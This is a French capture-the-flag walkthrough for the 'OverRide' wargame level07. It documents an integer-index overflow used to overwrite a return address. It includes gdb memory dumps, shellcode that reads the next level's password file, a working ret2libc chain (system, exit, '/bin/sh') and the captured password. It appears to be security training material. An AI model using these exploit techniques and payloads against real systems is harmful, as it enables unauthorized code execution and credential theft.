Ce programme boucle tant qu'il ne recoit pas la demande "quit" ou que la protection Canary ne detecte pas de probleme.

printf("Input command: ")                                = 15
fgets(Input command: quit
"quit\n", 20, 0xf7fcfac0)                          = 0xffffd6b8
+++ exited (status 0) +++


il lit un entier positif dans la memoire s'il recoit "read"

printf("Input command: ")                                = 15
fgets(Input command: read
"read\n", 20, 0xf7fcfac0)                          = 0xffffd6b8
printf(" Index: ")                                       = 8
fflush(0xf7fcfa20 Index: )                                       = 0
__isoc99_scanf(0x8048ad0, -11076, -11016, 0xf7e784af, 0xf7fcfa20
-5
) = 1
getchar(0xf7fcfa20, -11052, 19, 0xffd524, -10564)        = 10
printf(" Number at data[%u] is %u\n", 4294967291, 4294967291 Number at data[4294967291] is 4294967291
) = 42
printf(" Completed %s command successful"..., "read" Completed read command successfully
)    = 37


il met en memoire un entier positif a l'adresse demande s'il recoit "store"

printf("Input command: ")                                = 15
fgets(Input command: store
"store\n", 20, 0xf7fcfac0)                         = 0xffffd6b8
printf(" Number: ")                                      = 9
fflush(0xf7fcfa20 Number: )                                       = 0
__isoc99_scanf(0x8048ad0, -11076, -11016, 0xf7e784af, 0xf7fcfa20
-5
) = 1
getchar(-11064, 0xf7ff0a50, -11076, 0xffd524, -10563)    = 10
printf(" Index: ")                                       = 8
fflush(0xf7fcfa20 Index: )                                       = 0
__isoc99_scanf(0x8048ad0, -11076, -11016, 0xf7e784af, 0xf7fcfa20
-5
) = 1
getchar(0xf7fcfa20, -11052, -11076, 0xffd524, -10563)    = 10
printf(" Completed %s command successful"..., "store" Completed store command successfully
)   = 38


Sauf que la taille reservee sur la stack par ce programme n'atteint pas les valeur qu'elle affiche

Input command: store
 Number: 4294967294
 Index: 4294967294
 Completed store command successfully
Input command: read
 Index: 4294967294
 Number at data[4294967294] is 4294967294
 Completed read command successfully
Input command: read
 Index: 999999999999999999999999999999
 Number at data[4294967295] is 0
 Completed read command successfully


Quand on store des entier (41 et 40) au index 41 et 40, on obtient ce resultat dans la stack

(gdb) x/500x $esp
0xffffd4a0:	0x08048add	0x08048d60	0xffffd6b8	0xf7e2b6c0
0xffffd4b0:	0xf7fcfa20	0x08048d4b	0x00000028	0x00000028
0xffffd4c0:	0xffffd68d	0x08048d60	0xffffd6b8	0x080488ef
0xffffd4d0:	0xffffd4f4	0x00000014	0xf7fcfac0	0xf7fdc714
0xffffd4e0:	0x00000098	0xffffffff	0xffffd7b8	0xffffd758
0xffffd4f0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd500:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd510:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd520:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd530:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd540:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd550:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd560:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd570:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd580:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd590:	0x00000000	0x00000028	0x00000029	0x00000000

(gdb) x/x 0xffffd4f4+164
0xffffd598:	0x00000029

L'adresse de retour de la fonction store_number est:

(gdb)
0x080486d6 in store_number ()
1: x/5i $pc
=> 0x80486d6 <store_number+166>:	ret
   0x80486d7 <read_number>:	push   ebp
   0x80486d8 <read_number+1>:	mov    ebp,esp
   0x80486da <read_number+3>:	sub    esp,0x28
   0x80486dd <read_number+6>:	mov    DWORD PTR [ebp-0xc],0x0
(gdb)
0x080488ef in main ()

elle se trouve avant le debut du buffer qui recoit les informations dans cette fonction

(gdb) x/80x $esp
0xffffd4a0:	0xffffd68d	0x08048d60	0xffffd6b8	0xf7e2b6c0
0xffffd4b0:	0xf7fcfa20	0x08048d4b	0xffffd4d4	0xffffd4f4
0xffffd4c0:	0xffffd68d	0x08048d60	0xffffd6b8	0x080488ef
0xffffd4d0:	0xffffd4f4	0x00000014	0xf7fcfac0	0xf7fdc714
0xffffd4e0:	0x00000098	0xffffffff	0xffffd7b8	0xffffd758
0xffffd4f0:	0x00000000	0x00000000	0x00000001	0x00000000

Celle de get_unum aussi

(gdb) ni
0x0804861e in get_unum ()
1: x/5i $pc
=> 0x804861e <get_unum+55>:	ret
   0x804861f <prog_timeout>:	push   ebp
   0x8048620 <prog_timeout+1>:	mov    ebp,esp
   0x8048622 <prog_timeout+3>:	mov    eax,0x1
   0x8048627 <prog_timeout+8>:	mov    ebx,0x1
(gdb)
0x0804866b in store_number () (voir 0x2a en memoire pour buffer[1])

(gdb) x/80x $esp
0xffffd470:	0x08048ad0	0xffffd48c	0xffffd4c8	0xf7e784af
0xffffd480:	0xf7fcfa20	0x08048add	0xffffd4a4	0x00000001
0xffffd490:	0x00000001	0xf7e32fb4	0xffffd4c8	0x0804866b
0xffffd4a0:	0x08048add	0xffffd4f4	0x00000000	0xf7e2b6c0
0xffffd4b0:	0xffffd6b8	0xf7ff0a50	0x0000002a	0x00000000

Et il en va de meme pour toute les fonctions.
Par contre, on remarque qu'une des adresse qui suit le buffer dans store_number nous mene a un adresse executee dans le code apres l'appel de "quit"

(gdb) x/200x $esp
	...
0xffffd680:	0x00000000	0x00000001	0x726f7473	0x00000065
0xffffd690:	0x00000000	0x00000000	0x00000000	0xe61ad000
0xffffd6a0:	0xf7feb620	0x00000000	0x08048a09	0xf7fceff4
0xffffd6b0:	0x00000000	0x00000000	0x00000000	0xf7e45513

0xf7e45513 == 4158936339

Input command: read
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully

(gdb) x/x 0xf7e45513
0xf7e45513 <__libc_start_main+243>:	0x89

Input command: quit
0xf7e45513 in __libc_start_main () from /lib32/libc.so.6
1: x/5i $pc
=> 0xf7e45513 <__libc_start_main+243>:	mov    DWORD PTR [esp],eax
   0xf7e45516 <__libc_start_main+246>:	call   0xf7e5eb70 <exit>

Sauf que nous ne pouvons pas ecrire a une adresse qui donne 0 avec un % 3, selon les regles de wil

Input command: read
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully
Input command: store
 Number: 42
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command

Essayons donc, avec le systeme des unsigned int de trouver un emplacement qui pointe sur cet entier avec une input differente.

Input command: read
 Index: 4294967294
 Number at data[4294967294] is 4294967294
 Completed read command successfully
Input command: read
 Index: -4294967294
 Number at data[2] is 0
 Completed read command successfully
Input command: read
 Index: -4294967293
 Number at data[3] is 0
 Completed read command successfully

-4294967293 + 111

Input command: read
 Index: -4294967182
 Number at data[114] is 4158936339
 Completed read command successfully

Input command: store
 Number: 42
 Index: -4294967182
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command

2147483648 + 114

Input command: read
 Index: 2147483762
 Number at data[2147483762] is 4158936339
 Completed read command successfully

Input command: store
 Number: 42
 Index: 2147483762
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 42
 Completed read command successfully
Input command: quit
Segmentation fault (core dumped)

level07@OverRide:~$ dmesg
	...
[ 8898.102940] level07[1718]: segfault at 2a ip 000000000000002a sp 00000000ffffd6f0 error 14 in level07[8048000+1000]

Nous avons trouve la bonne adresse a reecrire pour segfault sur la sortie du programme, essayons maintenant de jump sur un shellcode de l'environnement

level07@OverRide:~$ export SHELLCODE=$(python -c 'print("\x90" * 80 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level08/.pass")')

(gdb) x/32x *environ
0xffffd7f4:	0x4c454853	0x444f434c	0x90903d45	0x90909090
0xffffd804:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd814:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd824:	0x90909090	0x90909090	0x90909090	0x90909090

Input command: store
 Number: 4294957092
 Index: 2147483762
 Completed store command successfully
Input command: quit
Segmentation fault (core dumped)
level07@OverRide:~$ dmesg
	...
[ 9282.373473] level07[1727]: segfault at 0 ip 00000000ffffd824 sp 00000000ffffd630 error 6

level07@OverRide:~$ readelf -l ./level07 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4

Input command: quit
0xffffd824 in ?? ()
1: x/5i $pc
=> 0xffffd824:	add    BYTE PTR [eax],al
   0xffffd826:	add    BYTE PTR [eax],al
   0xffffd828:	add    BYTE PTR [eax],al
   0xffffd82a:	add    BYTE PTR [eax],al
   0xffffd82c:	add    BYTE PTR [eax],al
(gdb) x/32x *environ
0xffffd7f4:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd804:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd814:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd824:	0x00000000	0x00000000	0x00000000	0x00000000

L'environnement est detruit apres etre passe par les instructions qui suivent le call "quit"
La seule facon d'avoir en memoire des instructions exploitable est donc d'aller chercher la ou elle ne bougeront pas, dans la libc.

(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"

On peut accessoirement rendre le programme plus propre en rajoutant un exit apres l'excecution de bin sh

(gdb) p exit
$1 = {<text variable, no debug info>} 0xf7e5eb70 <exit>

Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$ exit
level07@OverRide:~$
